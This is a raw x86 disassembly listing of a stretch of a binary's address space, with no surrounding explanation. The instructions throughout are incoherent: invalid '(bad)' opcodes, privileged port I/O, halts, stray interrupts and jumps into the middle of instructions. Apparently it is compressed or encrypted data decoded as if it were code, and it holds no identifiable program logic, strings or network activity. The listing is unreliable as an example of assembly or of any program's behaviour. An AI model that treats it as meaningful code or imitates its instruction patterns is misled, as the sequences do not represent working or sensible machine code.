  406956:	aa                   	stos   %al,%es:(%edi)
  406957:	3d c9 6f 4c b3       	cmp    $0xb34c6fc9,%eax
  40695c:	e6 e3                	out    %al,$0xe3
  40695e:	49                   	dec    %ecx
  40695f:	d3 9d 3f e7 d2 9a    	rcrl   %cl,-0x652d18c1(%ebp)
  406965:	70 46                	jo     0x4069ad
  406967:	06                   	push   %es
  406968:	8f                   	(bad)
  406969:	ed                   	in     (%dx),%eax
  40696a:	32 3b                	xor    (%ebx),%bh
  40696c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40696d:	ba 62 8c 52 e9       	mov    $0xe9528c62,%edx
  406972:	f4                   	hlt
  406973:	d7                   	xlat   %ds:(%ebx)
  406974:	8a c9                	mov    %cl,%cl
  406976:	b9 bf 3a ed 55       	mov    $0x55ed3abf,%ecx
  40697b:	22 d7                	and    %bh,%dl
  40697d:	3e dd 1e             	fstpl  %ds:(%esi)
  406980:	98                   	cwtl
  406981:	7c 95                	jl     0x406918
  406983:	9d                   	popf
  406984:	74 95                	je     0x40691b
  406986:	d7                   	xlat   %ds:(%ebx)
  406987:	53                   	push   %ebx
  406988:	de 47 de             	fiadds -0x22(%edi)
  40698b:	9c                   	pushf
  40698c:	f9                   	stc
  40698d:	77 e4                	ja     0x406973
  40698f:	fd                   	std
  406990:	64 9f                	fs lahf
  406992:	4a                   	dec    %edx
  406993:	f6 07 b6             	testb  $0xb6,(%edi)
  406996:	7f 20                	jg     0x4069b8
  406998:	67 52                	addr16 push %edx
  40699a:	cd 47                	int    $0x47
  40699c:	d5 9e                	aad    $0x9e
  40699e:	17                   	pop    %ss
  40699f:	35 bf 98 a0 ab       	xor    $0xaba098bf,%eax
  4069a4:	4f                   	dec    %edi
  4069a5:	35 06 0a 92 ff       	xor    $0xff920a06,%eax
  4069aa:	98                   	cwtl
  4069ab:	d0 36                	shlb   $1,(%esi)
  4069ad:	22 15 fc b1 00 a3    	and    0xa300b1fc,%dl
  4069b3:	e7 1d                	out    %eax,$0x1d
  4069b5:	fd                   	std
  4069b6:	eb d7                	jmp    0x40698f
  4069b8:	68 87 20 15 fc       	push   $0xfc152087
  4069bd:	09 47 3b             	or     %eax,0x3b(%edi)
  4069c0:	0c a9                	or     $0xa9,%al
  4069c2:	d0 93 50 a1 a7 21    	rclb   $1,0x21a7a150(%ebx)
  4069c8:	c3                   	ret
  4069c9:	e7 e1                	out    %eax,$0xe1
  4069cb:	0c b4                	or     $0xb4,%al
  4069cd:	67 e0 b3             	loopnew 0x406983
  4069d0:	90                   	nop
  4069d1:	ff 4d a3             	decl   -0x5d(%ebp)
  4069d4:	56                   	push   %esi
  4069d5:	b4 ad                	mov    $0xad,%ah
  4069d7:	f8                   	clc
  4069d8:	3c 64                	cmp    $0x64,%al
  4069da:	f8                   	clc
  4069db:	5c                   	pop    %esp
  4069dc:	b4 a1                	mov    $0xa1,%ah
  4069de:	6d                   	insl   (%dx),%es:(%edi)
  4069df:	c3                   	ret
  4069e0:	67 22 c3             	addr16 and %bl,%al
  4069e3:	67 63 2c             	arpl   %ebp,(%si)
  4069e6:	da b1 fc ef 34 c5    	fidivl -0x3acb1004(%ecx)
  4069ec:	e7 a3                	out    %eax,$0xa3
  4069ee:	1d ed 54 7c 36       	sbb    $0x367c54ed,%eax
  4069f3:	32 48 43             	xor    0x43(%eax),%cl
  4069f6:	2a f8                	sub    %al,%bh
  4069f8:	34 4c                	xor    $0x4c,%al
  4069fa:	02 fe                	add    %dh,%bh
  4069fc:	3b ee                	cmp    %esi,%ebp
  4069fe:	24 b4                	and    $0xb4,%al
  406a00:	33 f1                	xor    %ecx,%esi
  406a02:	19 c9                	sbb    %ecx,%ecx
  406a04:	f0 99                	lock cltd
  406a06:	98                   	cwtl
  406a07:	82 f6 6a             	xor    $0x6a,%dh
  406a0a:	2c 67                	sub    $0x67,%al
  406a0c:	50                   	push   %eax
  406a0d:	8a c4                	mov    %ah,%al
  406a0f:	2d 12 96 33 58       	sub    $0x58339612,%eax
  406a14:	83 c4 4d             	add    $0x4d,%esp
  406a17:	0d 96 33 28 47       	or     $0x47283396,%eax
  406a1c:	e2 66                	loop   0x406a84
  406a1e:	04 9f                	add    $0x9f,%al
  406a20:	9b                   	fwait
  406a21:	b8 c5 c0 a7 26       	mov    $0x26a7c0c5,%eax
  406a26:	83 b5 48 dc 38 e0 93 	xorl   $0xffffff93,-0x1fc723b8(%ebp)
  406a2d:	93                   	xchg   %eax,%ebx
  406a2e:	41                   	inc    %ecx
  406a2f:	35 52 c1 a7 72       	xor    $0x72a7c152,%eax
  406a34:	2e da eb             	cs (bad)
  406a37:	90                   	nop
  406a38:	0a d4                	or     %ah,%dl
  406a3a:	c0 02 b4             	rolb   $0xb4,(%edx)
  406a3d:	6b 91 0a d4 c1 42 b4 	imul   $0xffffffb4,0x42c1d40a(%ecx),%edx
  406a44:	eb 91                	jmp    0x4069d7
  406a46:	0a 3e                	or     (%esi),%bh
  406a48:	b5 0b                	mov    $0xb,%ch
  406a4a:	d0 5e 8f             	rcrb   $1,-0x71(%esi)
  406a4d:	54                   	push   %esp
  406a4e:	a0 11 8a d0 6e       	mov    0x6ed08a11,%al
  406a53:	42                   	inc    %edx
  406a54:	2a d0                	sub    %al,%dl
  406a56:	0c 8b                	or     $0x8b,%al
  406a58:	d1 6e 41             	shrl   $1,0x41(%esi)
  406a5b:	2a b0 01 96 a0 bd    	sub    -0x425f69ff(%eax),%dh
  406a61:	11 a9 c0 26 58 8a    	adc    %ebp,-0x75a7d940(%ecx)
  406a67:	f6 d1                	not    %cl
  406a69:	48                   	dec    %eax
  406a6a:	05 8e c1 bd 03       	add    $0x3bdc18e,%eax
  406a6f:	83 63 91 0a          	andl   $0xa,-0x6f(%ebx)
  406a73:	3e f5                	ds cmc
  406a75:	57                   	push   %edi
  406a76:	f2 ef                	repnz out %eax,(%dx)
  406a78:	96                   	xchg   %eax,%esi
  406a79:	20 15 70 62 ec 0a    	and    %dl,0xaec6270
  406a7f:	b8 30 6a fe f7       	mov    $0xf7fe6a30,%eax
  406a84:	4c                   	dec    %esp
  406a85:	38 d0                	cmp    %dl,%al
  406a87:	ee                   	out    %al,(%dx)
  406a88:	c0 a8 19 74 22 15 70 	shrb   $0x70,0x15227419(%eax)
  406a8f:	03 ff                	add    %edi,%edi
  406a91:	bb 5f bb 90 0a       	mov    $0xa90bb5f,%ebx
  406a96:	6c                   	insb   (%dx),%es:(%edi)
  406a97:	c1 a8 19 6c 45 2a e0 	shrl   $0xe0,0x2a456c19(%eax)
  406a9e:	c1 a8 19 6c 43 2a b8 	shrl   $0xb8,0x2a436c19(%eax)
  406aa5:	7f 58                	jg     0x406aff
  406aa7:	87 76 0f             	xchg   %esi,0xf(%esi)
  406aaa:	52                   	push   %edx
  406aab:	81 5e 8c 9a 81 17 a9 	sbbl   $0xa917819a,-0x74(%esi)
  406ab2:	40                   	inc    %eax
  406ab3:	1f                   	pop    %ds
  406ab4:	46                   	inc    %esi
  406ab5:	cd e0                	int    $0xe0
  406ab7:	78 a4                	js     0x406a5d
  406ab9:	02 3e                	add    (%esi),%bh
  406abb:	8c 5a 01             	mov    %ds,0x1(%edx)
  406abe:	3f                   	aas
  406abf:	c6                   	(bad)
  406ac0:	cb                   	lret
  406ac1:	a0 1f a9 e0 8e       	mov    0x8ee0a91f,%al
  406ac6:	a3 05 ed 1d 48       	mov    %eax,0x481ded05
  406acb:	05 76 62 bc 0c       	add    $0xcbc6276,%eax
  406ad0:	76 21                	jbe    0x406af3
  406ad2:	15 38 11 da f8       	adc    $0xf8da1138,%eax
  406ad7:	37                   	aaa
  406ad8:	6d                   	insl   (%dx),%es:(%edi)
  406ad9:	90                   	nop
  406ada:	0a 0c 62             	or     (%edx,%eiz,2),%cl
  406add:	ec                   	in     (%dx),%al
  406ade:	0c 4e                	or     $0x4e,%al
  406ae0:	42                   	inc    %edx
  406ae1:	2a 70 32             	sub    0x32(%eax),%dh
  406ae4:	c6                   	(bad)
  406ae5:	ce                   	into
  406ae6:	20 80 54 60 08 63    	and    %al,0x63086054(%eax)
  406aec:	57                   	push   %edi
  406aed:	e0 14                	loopne 0x406b03
  406aef:	8c 9a c1 a9 48 05    	mov    %ds,0x548a9c1(%edx)
  406af5:	f7 2d 1d 68 9f 8e    	imull  0x8e9f681d
  406afb:	54                   	push   %esp
  406afc:	70 87                	jo     0x406a85
  406afe:	e4 46                	in     $0x46,%al
  406b00:	fb                   	sti
  406b01:	17                   	pop    %ss
  406b02:	48                   	dec    %eax
  406b03:	05 ce c4 a8 f9       	add    $0xf9a8c4ce,%eax
  406b08:	b7 08                	mov    $0x8,%bh
  406b0a:	b6 a0                	mov    $0xa0,%dh
  406b0c:	7d 16                	jge    0x406b24
  406b0e:	46                   	inc    %esi
  406b0f:	cd e0                	int    $0xe0
  406b11:	6c                   	insb   (%dx),%es:(%edi)
  406b12:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406b13:	82 7b 9c ed          	cmpb   $0xed,-0x64(%ebx)
  406b17:	68 9f 8b 54 60       	push   $0x60548b9f
  406b1c:	3f                   	aas
  406b1d:	c6                   	(bad)
  406b1e:	ce                   	into
  406b1f:	e0 02                	loopne 0x406b23
  406b21:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406b22:	82 fb 1e             	cmp    $0x1e,%bl
  406b25:	2f                   	das
  406b26:	da 17                	ficoml (%edi)
  406b28:	21 15 b8 18 63 67    	and    %edx,0x676318b8
  406b2e:	70 09                	jo     0x406b39
  406b30:	52                   	push   %edx
  406b31:	81 4b 31 76 05 2e c3 	orl    $0xc32e0576,0x31(%ebx)
  406b38:	a8 19                	test   $0x19,%al
  406b3a:	5c                   	pop    %esp
  406b3b:	8e 54 70 77          	mov    0x77(%eax,%esi,2),%ss
  406b3f:	b4 13                	mov    $0x13,%ah
  406b41:	ed                   	in     (%dx),%eax
  406b42:	2b 91 0a 1c e0 7f    	sub    0x7fe01c0a(%ecx),%edx
  406b48:	b3 2c                	mov    $0x2c,%bl
  406b4a:	5c                   	pop    %esp
  406b4b:	85 54 e0 6a          	test   %edx,0x6a(%eax,%eiz,8)
  406b4f:	e0 ff                	loopne 0x406b50
  406b51:	74 db                	je     0x406b2e
  406b53:	35 48 05 86 81       	xor    $0x81860548,%eax
  406b58:	ff                   	ljmp   (bad)
  406b59:	eb 6d                	jmp    0x406bc8
  406b5b:	23 48 05             	and    0x5(%eax),%ecx
  406b5e:	77 52                	ja     0x406bb2
  406b60:	27                   	daa
  406b61:	a3 7d 1d 52 81       	mov    %eax,0x81521d7d
  406b66:	eb 31                	jmp    0x406b99
  406b68:	03 06                	add    (%esi),%eax
  406b6a:	37                   	aaa
  406b6b:	20 15 dc 5d 9d 0a    	and    %dl,0xa9d5ddc
  406b71:	fc                   	cld
  406b72:	1b 0e                	sbb    (%esi),%ecx
  406b74:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406b75:	a2 cd ff 7e 04       	mov    %al,0x47effcd
  406b7a:	06                   	push   %es
  406b7b:	37                   	aaa
  406b7c:	23 15 b8 05 33 60    	and    0x603305b8,%edx
  406b82:	70 2b                	jo     0x406baf
  406b84:	52                   	push   %edx
  406b85:	c1 fd de             	sar    $0xde,%ebp
  406b88:	5e                   	pop    %esi
  406b89:	e4 6d                	in     $0x6d,%al
  406b8b:	18 3b                	sbb    %bh,(%ebx)
  406b8d:	83 db 91             	sbb    $0xffffff91,%ebx
  406b90:	0a dc                	or     %ah,%bl
  406b92:	81 b1 33 b8 13 a9 c0 	xorl   $0x3e705dc0,-0x56ec47cd(%ecx)
  406b99:	5d 70 3e 
  406b9c:	da 77 23             	fidivl 0x23(%edi)
  406b9f:	15 dc a3 ed 47       	adc    $0x47eda3dc,%eax
  406ba4:	fb                   	sti
  406ba5:	5e                   	pop    %esi
  406ba6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406ba7:	02 f7                	add    %bh,%dh
  406ba9:	61                   	popa
  406baa:	36 0c ee             	ss or  $0xee,%al
  406bad:	47                   	inc    %edi
  406bae:	2a f0                	sub    %al,%dh
  406bb0:	20 66 c3             	and    %ah,-0x3d(%esi)
  406bb3:	e0 21                	loopne 0x406bd6
  406bb5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406bb6:	02 0f                	add    (%edi),%cl
  406bb8:	63 36                	arpl   %esi,(%esi)
  406bba:	0c 7e                	or     $0x7e,%al
  406bbc:	83 54 70 3f 77       	adcl   $0x77,0x3f(%eax,%esi,2)
  406bc1:	39 da                	cmp    %ebx,%edx
  406bc3:	8f                   	(bad)
  406bc4:	22 15 18 c5 6c 14    	and    0x146cc518,%dl
  406bca:	18 c3                	sbb    %al,%bl
  406bcc:	3c 18                	cmp    $0x18,%al
  406bce:	fc                   	cld
  406bcf:	16                   	push   %ss
  406bd0:	a9 c0 63 98 07       	test   $0x79863c0,%eax
  406bd5:	83 c7 91             	add    $0xffffff91,%edi
  406bd8:	0a 3c 89             	or     (%ecx,%ecx,4),%bh
  406bdb:	79 30                	jns    0x406c0d
  406bdd:	78 0a                	js     0x406be9
  406bdf:	a9 e0 0e f0 3a       	test   $0x3af00ee0,%eax
  406be4:	e0 7f                	loopne 0x406c65
  406be6:	76 f6                	jbe    0x406bde
  406be8:	3a b4 7f 87 79 30 78 	cmp    0x78307987(%edi,%edi,2),%dh
  406bef:	16                   	push   %ss
  406bf0:	a9 c0 73 70 23       	test   $0x237073c0,%eax
  406bf5:	f2 f7 98 0d c3 1d e2 	repnz negl -0x1de23cf3(%eax)
  406bfc:	4d                   	dec    %ebp
  406bfd:	fc                   	cld
  406bfe:	9b                   	fwait
  406bff:	b4 98                	mov    $0x98,%ah
  406c01:	0d 83 3f 20 15       	or     $0x15203f83,%eax
  406c06:	78 11                	js     0x406c19
  406c08:	b3 e1                	mov    $0xe1,%bl
  406c0a:	7f 3e                	jg     0x406c4a
  406c0c:	f5                   	cmc
  406c0d:	56                   	push   %esi
  406c0e:	b4 ff                	mov    $0xff,%ah
  406c10:	88 d9                	mov    %bl,%cl
  406c12:	30 38                	xor    %bh,(%eax)
  406c14:	84 54 e0 7f          	test   %dl,0x7f(%eax,%eiz,8)
  406c18:	30 1b                	xor    %bl,(%ebx)
  406c1a:	06                   	push   %es
  406c1b:	af                   	scas   %es:(%edi),%eax
  406c1c:	20 15 dc d7 de 85    	and    %dl,0x85ded7dc
  406c22:	f6 9f 90 0a bc 86    	negb   -0x7943f570(%edi)
  406c28:	d9 30                	fnstenv (%eax)
  406c2a:	78 1d                	js     0x406c49
  406c2c:	a9 e0 3e f3 3e       	test   $0x3ef33ee0,%eax
  406c31:	e4 9f                	in     $0x9f,%al
  406c33:	f9                   	stc
  406c34:	df cb                	(bad)
  406c36:	0b 6f 22             	or     0x22(%edi),%ebp
  406c39:	15 78 0b b3 61       	adc    $0x61b30b78,%eax
  406c3e:	30 8e 54 e0 2f 98    	xor    %cl,-0x67d01fac(%esi)
  406c44:	0d 83 b7 91 0a       	or     $0xa91b783,%eax
  406c49:	bc 83 d9 30 78       	mov    $0x7830d983,%esp
  406c4e:	17                   	pop    %ss
  406c4f:	a9 c0 7b 98 0d       	test   $0xd987bc0,%eax
  406c54:	83 f7 91             	xor    $0xffffff91,%edi
  406c57:	fc                   	cld
  406c58:	3b ae 8f 21 ff ca    	cmp    -0x3500de71(%esi),%ebp
  406c5e:	ff 2e                	ljmp   *(%esi)
  406c60:	5f                   	pop    %edi
  406c61:	f8                   	clc
  406c62:	1b 52 81             	sbb    -0x7f(%edx),%edx
  406c65:	0f 31                	rdtsc
  406c67:	1b fe                	sbb    %esi,%edi
  406c69:	e7 18                	out    %eax,$0x18
  406c6b:	9f                   	lahf
  406c6c:	42                   	inc    %edx
  406c6d:	fb                   	sti
  406c6e:	23 cc                	and    %esp,%ecx
  406c70:	46                   	inc    %esi
  406c71:	81 8f 31 0f 05 3e c1 	orl    $0xf8140cc1,0x3e050f31(%edi)
  406c78:	0c 14 f8 
  406c7b:	07                   	pop    %es
  406c7c:	c6                   	(bad)
  406c7d:	ae                   	scas   %es:(%edi),%al
  406c7e:	c0 a7 18 b5 82 bb db 	shlb   $0xdb,-0x447d4ae8(%edi)
  406c85:	3f                   	aas
  406c86:	22 3f                	and    (%edi),%bh
  406c88:	c3                   	ret
  406c89:	1d af 02 ff c2       	sbb    $0xc2ff02af,%eax
  406c8e:	48                   	dec    %eax
  406c8f:	19 7c 8e 54          	sbb    %edi,0x54(%esi,%ecx,4)
  406c93:	e0 df                	loopne 0x406c74
  406c95:	18 29                	sbb    %ch,(%ecx)
  406c97:	c3                   	ret
  406c98:	7d ef                	jge    0x406c89
  406c9a:	9f                   	lahf
  406c9b:	d0 fe                	sar    $1,%dh
  406c9d:	1a 23                	sbb    (%ebx),%ah
  406c9f:	65 f0 0d 52 81 6f 31 	gs lock or $0x316f8152,%eax
  406ca6:	52                   	push   %edx
  406ca7:	06                   	push   %es
  406ca8:	df 21                	fbld   (%ecx)
  406caa:	15 f8 1e 23 55       	adc    $0x55231ef8,%eax
  406caf:	e0 08                	loopne 0x406cb9
  406cb1:	ff                   	(bad)
  406cb2:	7b 82                	jnp    0x406c36
  406cb4:	01 d8                	add    %ebx,%eax
  406cb6:	61                   	popa
  406cb7:	b4 19                	mov    $0x19,%ah
  406cb9:	7b 9b                	jnp    0x406c56
  406cbb:	af                   	scas   %es:(%edi),%eax
  406cbc:	66 48                	dec    %ax
  406cbe:	5c                   	pop    %esp
  406cbf:	cd d8                	int    $0xd8
  406cc1:	bb 7c 35 43 e2       	mov    $0xe243357c,%ebx
  406cc6:	6a c6                	push   $0xffffffc6
  406cc8:	de e7                	fsubp  %st,%st(7)
  406cca:	ab                   	stos   %eax,%es:(%edi)
  406ccb:	19 12                	sbb    %edx,(%edx)
  406ccd:	57                   	push   %edi
  406cce:	33 f6                	xor    %esi,%esi
  406cd0:	57                   	push   %edi
  406cd1:	be 9a 21 15 08       	mov    $0x815219a,%esi
  406cd6:	67 1f                	addr16 pop %ds
  406cd8:	a2 1d 81 c4 75       	mov    %al,0x75c4811d
  406cdd:	8c 7d c4             	mov    %?,-0x3c(%ebp)
  406ce0:	d7                   	xlat   %ds:(%ebx)
  406ce1:	31 24 ae             	xor    %esp,(%esi,%ebp,4)
  406ce4:	63 ec                	arpl   %ebp,%esp
  406ce6:	13 be 8e 21 71 1d    	adc    0x1d71218e(%esi),%edi
  406cec:	63 9f 22 63 d8 67    	arpl   %ebx,0x67d86322(%edi)
  406cf2:	a8 d8                	test   $0xd8,%al
  406cf4:	90                   	nop
  406cf5:	0a ee                	or     %dh,%ch
  406cf7:	57                   	push   %edi
  406cf8:	3f                   	aas
  406cf9:	47                   	inc    %edi
  406cfa:	3b 16                	cmp    (%esi),%edx
  406cfc:	a9 40 1c fb 12       	test   $0x12fb1c40,%eax
  406d01:	99                   	cltd
  406d02:	c0 be 42 25 11 a9 40 	sarb   $0x40,-0x56eedabe(%esi)
  406d09:	12 fb                	adc    %bl,%bh
  406d0b:	06                   	push   %es
  406d0c:	ed                   	in     (%dx),%eax
  406d0d:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  406d0f:	02 29                	add    (%ecx),%ch
  406d11:	ec                   	in     (%dx),%al
  406d12:	3b e0                	cmp    %eax,%esp
  406d14:	7f fa                	jg     0x406d10
  406d16:	ea 3b b4 d3 d8 11 be 	ljmp   $0xbe11,$0xd8d3b43b
  406d1d:	ca 31 fe             	lret   $0xfe31
  406d20:	97                   	xchg   %eax,%edi
  406d21:	0c 67                	or     $0x67,%al
  406d23:	20 70 95             	and    %dh,-0x6b(%eax)
  406d26:	63 06                	arpl   %eax,(%esi)
  406d28:	b4 b3                	mov    $0xb3,%ah
  406d2a:	90                   	nop
  406d2b:	0a be 73 98 d0 9e    	or     -0x612f678d(%esi),%bh
  406d31:	8d 54 60 0e          	lea    0xe(%eax,%eiz,2),%edx
  406d35:	b3 30                	mov    $0x30,%bl
  406d37:	fe                   	(bad)
  406d38:	27                   	daa
  406d39:	9c                   	pushf
  406d3a:	2c 68                	sub    $0x68,%al
  406d3c:	e7 b0                	out    %eax,$0xb0
  406d3e:	50                   	push   %eax
  406d3f:	b4 73                	mov    $0x73,%ah
  406d41:	91                   	xchg   %eax,%ecx
  406d42:	0a cc                	or     %ah,%cl
  406d44:	67 e1 68             	loopew 0x406daf
  406d47:	2f                   	das
  406d48:	40                   	inc    %eax
  406d49:	2a 90 c7 22 d1 5e    	sub    0x5ed122c7(%eax),%dl
  406d4f:	88 54 20 9f          	mov    %dl,-0x61(%eax,%eiz,1)
  406d53:	cd 40                	int    $0x40
  406d55:	16                   	push   %ss
  406d56:	30 2b                	xor    %ch,(%ebx)
  406d58:	2a 85 48 05 8a 98    	sub    -0x6775fab8(%ebp),%al
  406d5e:	0d ed 45 48 05       	or     $0x54845ed,%eax
  406d63:	16                   	push   %ss
  406d64:	b3 58                	mov    $0x58,%bl
  406d66:	b4 8b                	mov    $0x8b,%ah
  406d68:	91                   	xchg   %eax,%ecx
  406d69:	0a 2c 61             	or     (%ecx,%eiz,2),%ch
  406d6c:	76 b4                	jbe    0x406d22
  406d6e:	4b                   	dec    %ebx
  406d6f:	90                   	nop
  406d70:	f8                   	clc
  406d71:	da cd                	fcmove %st(5),%st
  406d73:	12 d0                	adc    %al,%dl
  406d75:	5e                   	pop    %esi
  406d76:	81 c4 d7 65 96 84    	add    $0x849665d7,%esp
  406d7c:	f6 2a                	imulb  (%edx)
  406d7e:	24 ae                	and    $0xae,%al
  406d80:	b7 2c                	mov    $0x2c,%bh
  406d82:	05 ed 52 24 ae       	add    $0xae2452ed,%eax
  406d87:	b7 2c                	mov    $0x2c,%bh
  406d89:	0d b9 86 61 bc       	or     $0xbc6186b9,%eax
  406d8e:	50                   	push   %eax
  406d8f:	86 c4                	xchg   %al,%ah
  406d91:	d7                   	xlat   %ds:(%ebx)
  406d92:	44                   	inc    %esp
  406d93:	96                   	xchg   %eax,%esi
  406d94:	85 76 05             	test   %esi,0x5(%esi)
  406d97:	12 d7                	adc    %bh,%dl
  406d99:	5b                   	pop    %ebx
  406d9a:	36 1b ed             	ss sbb %ebp,%ebp
  406d9d:	b5 48                	mov    $0x48,%ch
  406d9f:	05 d6 b1 b9 68       	add    $0x68b9b1d6,%eax
  406da4:	d7                   	xlat   %ds:(%ebx)
  406da5:	20 15 a8 65 f3 d0    	and    %dl,0xd0f365a8
  406dab:	ae                   	scas   %es:(%edi),%al
  406dac:	43                   	inc    %ebx
  406dad:	2a 50 cf             	sub    -0x31(%eax),%dl
  406db0:	72 d1                	jb     0x406d83
  406db2:	6e                   	outsb  %ds:(%esi),(%dx)
  406db3:	40                   	inc    %eax
  406db4:	2a b0 9e 2d 40 36    	sub    0x36402d9e(%eax),%dh
  406dba:	b2 85                	mov    $0x85,%dl
  406dbc:	a8 34                	test   $0x34,%al
  406dbe:	21 71 75             	and    %esi,0x75(%ecx)
  406dc1:	65 05 68 b7 20 71    	gs add $0x7120b768,%eax
  406dc7:	75 c5                	jne    0x406d8e
  406dc9:	b7 2e                	mov    $0x2e,%bh
  406dcb:	5c                   	pop    %esp
  406dcc:	5d                   	pop    %ebp
  406dcd:	91                   	xchg   %eax,%ecx
  406dce:	0a b4 b1 c5 68 6f 42 	or     0x426f68c5(%ecx,%esi,4),%dh
  406dd5:	2a 70 34             	sub    0x34(%eax),%dh
  406dd8:	5b                   	pop    %ebx
  406dd9:	82 f6 31             	xor    $0x31,%dh
  406ddc:	48                   	dec    %eax
  406ddd:	05 8e 65 4b d1       	add    $0xd14b658e,%eax
  406de2:	3e 0e                	ds push %cs
  406de4:	a9 40 3b 5b 8e       	test   $0x8e5b3b40,%eax
  406de9:	74 b2                	je     0x406d9d
  406deb:	95                   	xchg   %eax,%ebp
  406dec:	a8 b8                	test   $0xb8,%al
  406dee:	90                   	nop
  406def:	0a 6c 66 ab          	or     -0x55(%esi,%eiz,2),%ch
  406df3:	d1 ee                	shr    $1,%esi
  406df5:	40                   	inc    %eax
  406df6:	2a d0                	sub    %al,%dl
  406df8:	c9                   	leave
  406df9:	1c 68                	sbb    $0x68,%al
  406dfb:	bb 91 0a 74 b1       	mov    $0xb1740a91,%ebx
  406e00:	32 b4 b7 20 71 75 65 	xor    0x65757120(%edi,%esi,4),%dh
  406e07:	15 68 6f 43 2a       	adc    $0x2a436f68,%eax
  406e0c:	b0 9d                	mov    $0x9d,%al
  406e0e:	ad                   	lods   %ds:(%esi),%eax
  406e0f:	45                   	inc    %ebp
  406e10:	bb 1b a9 40 0f       	mov    $0xf40a91b,%ebx
  406e15:	ab                   	stos   %eax,%es:(%edi)
  406e16:	46                   	inc    %esi
  406e17:	bb 17 a9 80 97       	mov    $0x9780a917,%ebx
  406e1c:	ad                   	lods   %ds:(%esi),%eax
  406e1d:	43                   	inc    %ebx
  406e1e:	f6 b1 5a 54 8e 47    	divb   0x478e545a(%ecx)
  406e24:	e2 1a                	loop   0x406e40
  406e26:	cb                   	lret
  406e27:	ea d1 f6 23 15 d8 c1 	ljmp   $0xc1d8,$0x1523f6d1
  406e2e:	d6                   	salc
  406e2f:	a3 bd 13 a9 c0       	mov    %eax,0xc0a913bd
  406e34:	2e d6                	cs salc
  406e36:	c4                   	(bad)
  406e37:	f8                   	clc
  406e38:	f7 73 9a             	divl   -0x66(%ebx)
  406e3b:	d0 3e                	sarb   $1,(%esi)
  406e3d:	81 b5 a0 7d 22 52 81 	xorl   $0x236c3d81,0x52227da0(%ebp)
  406e44:	3d 6c 23 
  406e47:	72 90                	jb     0x406dd9
  406e49:	b5 a1                	mov    $0xa1,%ch
  406e4b:	72 12                	jb     0x406e5f
  406e4d:	12 d7                	adc    %bh,%dl
  406e4f:	58                   	pop    %eax
  406e50:	76 34                	jbe    0x406e86
  406e52:	da 01                	fiaddl (%ecx)
  406e54:	24 ae                	and    $0xae,%al
  406e56:	b1 ec                	mov    $0xec,%cl
  406e58:	58                   	pop    %eax
  406e59:	b4 4f                	mov    $0x4f,%ah
  406e5b:	41                   	inc    %ecx
  406e5c:	e2 ea                	loop   0x406e48
  406e5e:	ca da d1             	lret   $0xd1da
  406e61:	3e 1d 89 ab 2b 73    	ds sbb $0x732bab89,%eax
  406e67:	a1 fd 0b 24 ae       	mov    0xae240bfd,%eax
  406e6c:	ae                   	scas   %es:(%edi),%al
  406e6d:	ac                   	lods   %ds:(%esi),%al
  406e6e:	03 ed                	add    %ebp,%ebp
  406e70:	bd 48 5c 5d 99       	mov    $0x995d5c48,%ebp
  406e75:	1b 79 36             	sbb    0x36(%ecx),%edi
  406e78:	db 82 ca 39 48 05    	fildl  0x54839ca(%edx)
  406e7e:	ce                   	into
  406e7f:	65 1e                	gs push %ds
  406e81:	c6                   	(bad)
  406e82:	bf f5 ef 41 7b       	mov    $0x7b41eff5,%edi
  406e87:	1f                   	pop    %ds
  406e88:	db 8e f6 7e a4 02    	fisttpl 0x2a47ef6(%esi)
  406e8e:	17                   	pop    %ss
  406e8f:	b0 1e                	mov    $0x1e,%al
  406e91:	b4 2f                	mov    $0x2f,%ah
  406e93:	44                   	inc    %esp
  406e94:	2a 70 11             	sub    0x11(%eax),%dh
  406e97:	f3 a2 7d 31 52 81    	repz mov %al,0x8152317d
  406e9d:	4b                   	dec    %ebx
  406e9e:	d8 f1                	fdiv   %st(1),%st
  406ea0:	c8 4b 99 1f          	enter  $0x994b,$0x1f
  406ea4:	95                   	xchg   %eax,%ebp
  406ea5:	cb                   	lret
  406ea6:	90                   	nop
  406ea7:	0a 5c ce 06          	or     0x6(%esi,%ecx,8),%bl
  406eab:	d0 be 02 a9 c0 95    	sarb   $1,-0x6a3f56fe(%esi)
  406eb1:	6c                   	insb   (%dx),%es:(%edi)
  406eb2:	27                   	daa
  406eb3:	da 07                	fiaddl (%edi)
  406eb5:	90                   	nop
  406eb6:	0a 5c c5 76          	or     0x76(%ebp,%eax,8),%bl
  406eba:	a3 7d 35 52 81       	mov    %eax,0x8152357d
  406ebf:	6b 18 ff             	imul   $0xffffffff,(%eax),%ebx
  406ec2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406ec3:	30 87 91 0a 5c c7    	xor    %al,-0x38a3f56f(%edi)
  406ec9:	f8                   	clc
  406eca:	bf 86 79 3d 52       	mov    $0x523d7986,%edi
  406ecf:	81 1b d8 c9 68 ff    	sbbl   $0xff68c9d8,(%ebx)
  406ed5:	12 a9 c0 8d 6c 08    	adc    0x86c8dc0(%ecx),%ch
  406edb:	ed                   	in     (%dx),%eax
  406edc:	5f                   	pop    %edi
  406edd:	21 15 b8 89 9d 8a    	and    %edx,0x8a9d89b8
  406ee3:	3c 88                	cmp    $0x88,%al
  406ee5:	6f                   	outsl  %ds:(%esi),(%dx)
  406ee6:	ce                   	into
  406ee7:	b8 d2 22 71 a5       	mov    $0xa57122d2,%eax
  406eec:	65 bf 40 fb 56 24    	gs mov $0x2456fb40,%edi
  406ef2:	ae                   	scas   %es:(%edi),%al
  406ef3:	b4 6c                	mov    $0x6c,%ah
  406ef5:	2f                   	das
  406ef6:	da b7 21 15 b8 9d    	fidivl -0x6247eadf(%edi)
  406efc:	9d                   	popf
  406efd:	8d                   	lea    (bad),%esi
  406efe:	f6 1d 48 05 ee 64    	negb   0x64ee0548
  406f04:	e7 a2                	out    %eax,$0xa2
  406f06:	7d 17                	jge    0x406f1f
  406f08:	52                   	push   %edx
  406f09:	81 bb f9 df a5 0d f7 	cmpl   $0xb81520f7,0xda5dff9(%ebx)
  406f10:	20 15 b8 
  406f13:	97                   	xchg   %eax,%edi
  406f14:	ed                   	in     (%dx),%eax
  406f15:	47                   	inc    %edi
  406f16:	fb                   	sti
